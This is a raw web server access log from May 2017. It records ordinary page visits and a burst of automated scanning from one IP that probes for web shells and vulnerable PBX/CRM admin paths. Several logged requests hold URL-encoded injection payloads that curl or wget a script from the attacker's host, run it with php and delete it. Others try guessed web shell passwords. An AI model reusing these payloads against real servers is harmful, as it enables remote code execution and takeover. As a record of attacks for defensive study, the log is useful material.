116.102.140.242 - - [02/May/2017:02:53:40 +0000] "GET / HTTP/1.1" 200 8624 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
116.102.140.242 - - [02/May/2017:02:53:40 +0000] "GET /main.css HTTP/1.1" 200 11136 "http://45.76.177.252:8889/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
116.102.140.242 - - [02/May/2017:02:53:40 +0000] "GET /main.js HTTP/1.1" 200 19677 "http://45.76.177.252:8889/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
116.102.140.242 - - [02/May/2017:02:53:41 +0000] "GET /firebase-logo.png HTTP/1.1" 200 3542 "http://45.76.177.252:8889/main.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
116.102.140.242 - - [02/May/2017:02:53:41 +0000] "GET /favicon.ico HTTP/1.1" 200 8624 "http://45.76.177.252:8889/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
116.102.140.242 - - [02/May/2017:02:54:07 +0000] "GET /silhouette.jpg HTTP/1.1" 200 4536 "http://45.76.177.252:8889/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
51.15.12.13 - - [25/May/2017:16:14:47 +0000] "POST /recordings/Go.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:14:48 +0000] "POST /recordings/info.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:14:49 +0000] "POST /recordings/11.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:14:49 +0000] "POST /vtigercrm/moaz.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:14:51 +0000] "POST /vtigercrm/11.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:14:52 +0000] "POST /11.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:14:52 +0000] "POST /recordings/a8a.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:14:53 +0000] "POST /wav.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:14:54 +0000] "POST /_asterisk/V-E-M.php?268e31510577740=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bwget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:14:54 +0000] "POST /x1.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:14:55 +0000] "POST /recordings/webadmin.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:14:56 +0000] "POST /panel/webadmin.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:14:56 +0000] "POST /webadmin.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:14:57 +0000] "POST /panel/main.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:14:58 +0000] "POST /panel/main.php?act=cmd HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:14:58 +0000] "POST /panel/main.php.1 HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:14:59 +0000] "POST /panel/main.php.1?act=cmd HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:14:59 +0000] "POST /panel/main.php.2 HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:00 +0000] "POST /panel/main.php.2?act=cmd HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:00 +0000] "POST /recordings/main.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:01 +0000] "POST /recordings/main.php?act=cmd HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:01 +0000] "POST /recordings/main.php.1 HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:02 +0000] "POST /recordings/main.php.1?act=cmd HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:02 +0000] "POST /recordings/main.php.2 HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:03 +0000] "POST /recordings/main.php.2?act=cmd HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:03 +0000] "POST /main.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:04 +0000] "POST /main.php?act=cmd HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:04 +0000] "POST /vtigercrm/main.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:05 +0000] "POST /vtigercrm/main.php?act=cmd HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:05 +0000] "POST /config.all.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:06 +0000] "POST /recordings/config.all.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:06 +0000] "POST /panel/config.all.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:07 +0000] "POST /vtigercrm/config.all.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:08 +0000] "POST /admin/config.all.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:08 +0000] "POST /0x4148.php.call HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:09 +0000] "POST /recordings/misc/?cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bwget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:10 +0000] "POST /graph.php?module=upload HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:10 +0000] "POST /recordings/graph.php?module=upload HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:11 +0000] "POST /vtigercrm/graph.php?module=upload HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:12 +0000] "POST /vtigercrm/phpversions.php?module=upload HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:13 +0000] "POST /recordings/phpversions.php?module=upload HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [25/May/2017:16:15:13 +0000] "POST /phpversions.php?module=upload HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
27.64.57.160 - - [26/May/2017:00:43:08 +0000] "GET / HTTP/1.1" 200 8859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
27.64.57.160 - - [26/May/2017:00:43:08 +0000] "GET /main.css HTTP/1.1" 200 11199 "http://45.76.177.252:8888/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
27.64.57.160 - - [26/May/2017:00:43:08 +0000] "GET /main.js HTTP/1.1" 200 20830 "http://45.76.177.252:8888/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
27.64.57.160 - - [26/May/2017:00:43:09 +0000] "GET /firebase-logo.png HTTP/1.1" 200 3542 "http://45.76.177.252:8888/main.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
27.64.57.160 - - [26/May/2017:00:43:10 +0000] "GET /favicon.ico HTTP/1.1" 200 8859 "http://45.76.177.252:8888/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
27.64.57.160 - - [26/May/2017:00:43:13 +0000] "GET /silhouette.jpg HTTP/1.1" 200 4536 "http://45.76.177.252:8888/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
27.64.57.160 - - [26/May/2017:00:45:50 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
27.64.57.160 - - [26/May/2017:00:45:52 +0000] "GET /favicon.ico HTTP/1.1" 200 8859 "http://45.76.177.252:8888/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
116.109.240.213 - - [26/May/2017:00:51:33 +0000] "GET /silhouette.jpg HTTP/1.1" 200 4536 "http://45.76.177.252:8888/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36"
116.109.240.213 - - [26/May/2017:00:51:48 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36"
116.109.240.213 - - [26/May/2017:00:54:43 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36"
66.102.6.151 - - [26/May/2017:01:36:09 +0000] "GET / HTTP/1.1" 200 8859 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.102.6.152 - - [26/May/2017:01:36:09 +0000] "GET /favicon.ico HTTP/1.1" 200 8859 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
163.172.109.120 - - [26/May/2017:04:52:09 +0000] "GET /recordings/index.php HTTP/1.1" 404 8859 "-" "curl/7.29.0"
51.15.12.13 - - [26/May/2017:05:01:03 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03\xD2\x0B\xFCK\xC4yUj6/\xA3q\xF5\xF6\x9D\xC8\xED\x10\xBF&\x90\xD08<\xA7\x223\xBF\x13+\xEEm\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [26/May/2017:05:01:03 +0000] "GET /recordings/index.php HTTP/1.1" 404 8859 "-" "-"
51.15.12.13 - - [26/May/2017:05:01:04 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03/^\xC7#\xEA\x90\xB7" 400 173 "-" "-"
51.15.12.13 - - [26/May/2017:05:01:05 +0000] "POST /admin/ajax.php?module=music HTTP/1.1" 404 8859 "http://45.76.177.252:8888/admin/config.php" "-"
51.15.12.13 - - [26/May/2017:05:01:06 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03\x80\xFA\xA4G\xF7\x0C!\x1C\x94~\x90\xD8\xD0U\xC6&\x12X\xE7\xE6!\x99\xDA\x85-b)\xA9n\xCFN\xC0\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [26/May/2017:05:01:06 +0000] "POST /admin/ajax.php?module=blacklist HTTP/1.1" 404 8859 "http://45.76.177.252:8888/admin/config.php" "-"
51.15.12.13 - - [26/May/2017:05:01:08 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03\xF6Qc\x22\xD0\x90\xF5\xDDX\xEA\xD6[\xA3\x0F\xB1\xBB2)\x83\xD42\x81\xCE\xD7pN\x9B\x99\xA7\xCD\x1A\xE9\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [26/May/2017:05:01:08 +0000] "POST /admin/ajax.php?module=recordings HTTP/1.1" 404 8859 "http://45.76.177.252:8888/admin/config.php" "-"
51.15.12.13 - - [26/May/2017:05:01:09 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03\x08\xA7]TSX\x01@" 400 173 "-" "-"
51.15.12.13 - - [26/May/2017:05:01:09 +0000] "GET /admin/ajax.php HTTP/1.1" 404 8859 "/admin/index.php" "-"
51.15.12.13 - - [26/May/2017:05:01:11 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03\xB9S&$\xFE\xCC>\xF4\xAE=q5y\x07!\xC6\xFBR@a\x87\x05_\xD73$::\xF3\x09@\xBE\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [26/May/2017:05:01:11 +0000] "GET /admin/config.php?display=OpenVAS&handler=api&file=OpenVAS&module=OpenVAS&function=system&args=id HTTP/1.1" 404 8859 "-" "-"
51.15.12.13 - - [26/May/2017:05:01:12 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03:\xE9\xC8\xD7\xD6\x8D\xEF|\x16*\x18\x22u\x0480;Y\xBEb\xC1\x05\xC4\xFB\xEC\xA6\xD4\x9Fs\x93Ms\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [26/May/2017:05:01:13 +0000] "GET /admin/modules/backup/page.backup.php HTTP/1.1" 404 8859 "-" "-"
51.15.12.13 - - [26/May/2017:05:01:14 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03~1gL\xD3\x0C\xF8\xF7\xCE\x92\xDC<+\xF8\xC8Tz\xC4\xF2\xF8Hx\x9F\xBD\x1E\x01\xCE3\xC52q%\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [26/May/2017:05:01:14 +0000] "POST /vtigercrm/phprint.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/vtigercrm/phprint.php" "-"
51.15.12.13 - - [26/May/2017:05:01:15 +0000] "\x16\x03\x01\x00\x98\x01\x00\x00\x94\x03\x03r\x02\xF6\x12F\x7F\xBF\x8B\xA5\xA3S\xC8\x8E\xB2W\x86n{\x82U\x98\xD0\x1E\x12\x82fN9\xFB\x8Aj\x00\x00\x006\xC0,\xC0" 400 173 "-" "-"
51.15.12.13 - - [26/May/2017:05:01:16 +0000] "POST / HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:16 +0000] "POST /admin/modules/admindashboard/phpsysinfo/common_admin_functions.php?c=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:17 +0000] "POST /recordings/jeep.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:18 +0000] "POST /admin/bootstrap.inc.php?mgp=danc3Uf%40t HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:18 +0000] "POST /recordings/a7a.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:19 +0000] "POST /recordings/emad-shell.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:20 +0000] "POST /recordings/emad.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:20 +0000] "POST /recordings/cmd.php?pass=lollol&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:21 +0000] "POST /recordings/mcd.php?pass=lollol&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:22 +0000] "POST /recordings/dmc.php?pass=lollol&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:22 +0000] "POST /recordings/cmd.php?pass=dandan2017&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:23 +0000] "POST /recordings/mcd.php?pass=dandan2017&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:24 +0000] "POST /recordings/dmc.php?pass=dandan2017&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:24 +0000] "POST /recordings/cmd.php?pass=test&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:25 +0000] "POST /recordings/mcd.php?pass=test&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:26 +0000] "POST /recordings/dmc.php?pass=test&cmd=id%3Buname+-a%3Bcurl+-ks+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out+%7C%7C+wget+http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+-O+%2Ftmp%2Fa.out+%7C%7C+GET++http%3A%2F%2F51.15.12.13%2Ft%2Fcmd.txt+%3E+%2Ftmp%2Fa.out%3Bphp+%2Ftmp%2Fa.out%3Brm+%2Ftmp%2Fa.out HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:26 +0000] "POST /recordings/config.amportal.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:27 +0000] "POST /recordings/scan.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:28 +0000] "POST /vtigercrm/a7a.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:28 +0000] "POST /vtigercrm/Hima.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:29 +0000] "POST /vtigercrm/xXx-mat.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:29 +0000] "POST /vtigercrm/Himaa.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:30 +0000] "POST /recordings/3Zz.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:31 +0000] "POST /vtigercrm/3Zz.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:31 +0000] "POST /vtigercrm/zizo.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:32 +0000] "POST /vtigercrm/ops.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:33 +0000] "POST /vtigercrm/xXx-ELMAYET-xXx.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:33 +0000] "POST /zz.php.call HTTP/1.1" 405 173 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:34 +0000] "POST /vtigercrm/z.php?pass=angel HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:35 +0000] "POST /z.php?pass=angel HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:35 +0000] "POST /recordings/lol.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:36 +0000] "POST /recordings/badr2.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:37 +0000] "POST /recordings/Go.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:37 +0000] "POST /recordings/info.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:38 +0000] "POST /recordings/11.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:39 +0000] "POST /vtigercrm/moaz.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:39 +0000] "POST /vtigercrm/11.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:40 +0000] "POST /11.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:41 +0000] "POST /recordings/a8a.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
51.15.12.13 - - [26/May/2017:05:01:41 +0000] "POST /wav.php HTTP/1.1" 404 8859 "http://45.76.177.252:8888/" "-"
